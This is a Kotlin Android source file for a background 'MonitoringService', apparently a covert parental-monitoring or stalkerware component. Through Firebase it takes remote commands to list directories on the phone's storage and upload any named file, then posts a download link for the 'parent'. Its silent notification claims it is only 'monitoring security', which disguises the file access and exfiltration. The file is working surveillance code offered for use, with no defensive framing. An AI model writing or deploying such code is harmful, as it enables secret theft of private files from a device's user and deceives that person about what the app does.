package com.assisten.gestion

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import java.io.File

class MonitoringService : Service() {

    private val database = FirebaseDatabase.getInstance().reference
    private val storage = FirebaseStorage.getInstance().reference
    private val childId = "hijo_uno"

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        setupCommandListener()
    }

    private fun setupCommandListener() {
        database.child("commands").child(childId).addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val command = snapshot.child("type").getValue(String::class.java)
                val path = snapshot.child("path").getValue(String::class.java) ?: ""

                when (command) {
                    "GET_FILES" -> sendFilesList(path)
                    "UPLOAD_FILE" -> uploadFileToStorage(path)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun sendFilesList(path: String) {
        val targetPath = if (path.isEmpty()) Environment.getExternalStorageDirectory().absolutePath else path
        val directory = File(targetPath)
        val files = directory.listFiles() ?: emptyArray()
        
        val fileList = files.map {
            mapOf(
                "name" to it.name,
                "isDirectory" to it.isDirectory,
                "path" to it.absolutePath
            )
        }
        database.child("responses").child(childId).setValue(fileList)
    }

    private fun uploadFileToStorage(path: String) {
        val file = File(path)
        if (!file.exists() || file.isDirectory) return

        val fileUri = Uri.fromFile(file)
        val storageRef = storage.child("transfers/$childId/${file.name}")

        storageRef.putFile(fileUri).addOnSuccessListener {
            storageRef.downloadUrl.addOnSuccessListener { url ->
                // Notificar al padre que el archivo está listo y darle el link
                database.child("file_ready").child(childId).setValue(mapOf(
                    "name" to file.name,
                    "url" to url.toString(),
                    "timestamp" to System.currentTimeMillis()
                ))
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotification(): Notification {
        val channelId = "monitoring_service"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "Sistema de Gestión", NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Protección Activa")
            .setContentText("El sistema está monitoreando la seguridad.")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()
    }
}
